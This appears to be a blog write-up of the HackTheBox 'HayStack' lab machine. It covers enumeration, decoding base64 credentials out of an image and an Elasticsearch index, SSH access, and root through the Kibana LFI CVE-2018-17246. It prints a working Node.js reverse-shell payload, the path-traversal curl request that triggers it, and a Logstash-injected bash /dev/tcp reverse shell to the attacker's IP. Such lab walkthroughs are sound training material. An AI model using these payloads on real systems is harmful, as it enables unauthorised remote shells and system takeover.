---
date: 2019-11-01 23:48:05
layout: post
title:  "HackTheBox - HayStack"
subtitle: "Created by: X-Billy"
description: >- 
  Created by: X-Billy
tags: 
  - hackthebox 
  - forensic 
  - api 
  - privilege-escalation
image: >- 
    /assets/img/hackthebox/heystack/banner.jpg
voptimized_image: >- 
  /assets/img/hackthebox/heystack/banner.jpg
category: blog
author: Abdullah Hassan
paginate: true
---

# Enumeration

> Nmap Scan 

First thing we will start with nmap scan `nmap -sVC 10.10.10.115`  


```
root@X-Billy:~# nmap -sV 10.10.10.115
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-24 11:42 EET
Nmap scan report for 10.10.10.115
Host is up (0.14s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    nginx 1.12.2
9200/tcp open  http    nginx 1.12.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds
```  


as we see port `22,80` and `9200` is open  

lets take alook on port 80   


![image](/assets/img/hackthebox/heystack/needle.jpg)


it's just a pic called `needle.jpg`  
let's see the strings of this pic  

```
root@X-Billy:~/Desktop# strings -10 needle.jpg 
paint.net 4.1.1
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
>S)T;M7\{Y
WEL/;wg-J3
T.-UWuvFG,
Euw!i$goRk
5)5=FI$b[=+
*Oo!;.o|?>
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==

```

there is a base64 in this pic let's decode it  

```
root@X-Billy:~/Desktop# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== |base64 --decode
la aguja en el pajar es "clave"

```

that's the output 'la aguja en el pajar es "clave"' when we translate it this becomes  
`the needle in the haystack is “key”`

Let's take alook on port 9200  

```
root@X-Billy:~/Desktop# curl http://10.10.10.115:9200
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}

```

> Fuzzing 

as we see the version of Elasticsearch database is 6.4.2  
I search about this version and i found that this version is vulnrable with local file inclusion `CVE-2018-17246`  
we need to find the information hidden in the haystack.I using the wfuzz with common list to know the parameters in 10.10.10.115:9200 using command   

```Shell
root@X-Billy:~/Desktop# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.115:9200/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.115:9200/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                             
===================================================================

000000036:   400        0 L      17 W     321 Ch      "_admin"                            
000000042:   200        0 L      1 W      245 Ch      "administrator"                     
000000094:   200        0 L      1 W      1010 Ch     "bank"                              
000000589:   400        0 L      17 W     321 Ch      "_pages"                            

Total time: 20.91859
Processed Requests: 949
Filtered Requests: 945
Requests/sec.: 45.36634

```

okaai I found that there is `_` before some parameters , lets fuzz using `_`  

Using command 
```Shell
root@X-Billy:~/Desktop# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404,400 http://10.10.10.115:9200/_FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.115:9200/_FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                       
===================================================================

000000052:   200        0 L      1 W      103 Ch      "alias"                                       
000000053:   200        0 L      1 W      103 Ch      "aliases"                                     
000000054:   200        0 L      1 W      4470 Ch     "all"                                         
000000129:   405        0 L      12 W     102 Ch      "bulk"                                        
000000145:   200        28 L     28 W     493 Ch      "cat"                                         
000000213:   200        0 L      1 W      76 Ch       "count"                                       
000000576:   405        0 L      11 W     97 Ch       "open"                                        
000000715:   200        0 L      17 W     6456 Ch     "search"                                      
000000743:   200        0 L      1 W      854 Ch      "settings"                                    
000000790:   200        0 L      1 W      20986 Ch    "stats"                                       
000000823:   200        0 L      1 W      40327 Ch    "template"                                    

Total time: 23.53877
Processed Requests: 949
Filtered Requests: 938
Requests/sec.: 40.31644

```

I find parameter call search ... let's search about query `= "clave"`  

```Shell
root@X-Billy:~/Desktop# curl -X GET "http://10.10.10.115:9200/_search?q=clave"
{"took":5,"timed_out":false,"_shards":{"total":16,"successful":16,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
```

as we see we found two base64 strings lets decode them  

```Shell
root@X-Billy:~/Desktop# echo dXNlcjogc2VjdXJpdHkg | base64 --decode
 user: security 
 root@PEN-TEST-PC1:~/Desktop# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 --decode
 pass: spanish.is.key

```

nice we find the user creds 

> USER FLAG 

okaii lets connect by ssh useing these creds 

```Shell
root@X-Billy:~/Desktop# ssh security@10.10.10.115
security@10.10.10.115's password: 
Last login: Thu Oct 24 07:17:53 2019 from 10.10.16.161
[security@haystack ~]$
```

yup the creds are working  
lets see what is there 

```
[security@haystack ~]$ cat user.txt 
04d18bc79dac1d4d48ee0a940c8eb929
```

> Privilege Escalation 

We find LFI on Elasticsearch version .. okaai lets get a shell as a user kibana  

I use this javaScript shell i replace the ip and the port  

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8001, "10.10.16.161", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

```

I put it in /dev/shm  

and as we see kibana is running on port 5601 by reading the /etc/kibana/kibana.yml  

i make the following curl req to execute our reverse shell  

```
[security@haystack shm]$ curl -X GET "localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../dev/shm/rev.js" -H "kbnxsrf:true"
```

now i take a shell as `kibana user`

```Shell
root@X-Billy:~# nc -lvp 8001
listening on [any] 8001 ...
10.10.10.115: inverse host lookup failed: Unknown host
connect to [10.10.16.161] from (UNKNOWN) [10.10.10.115] 36212
whoami
kibana
```

and now we will go to the configration file `/etc/logstash/conf.d`

```Shell
cd /etc/logstash/conf.d
ls
filter.conf
input.conf
output.conf
```

lets check what is inside `filter.conf` 

```
cat filter.conf
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
```

nicee .. this filter allows us to excute commands with the proper  
now we will make our logstash file and put it into `/opt/kibana`  

`Ejecutar comando : bash -i >& /dev/tcp/10.10.16.161/6666 0>&1`  

after make this file lets listening to `port 6666`  

with command `root@X-Billy:~/Desktop# nc -lvp 6666`  

> finally Rooted

```Shell
root@X-Billy:# cat /root/root.txt
cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d9`
```
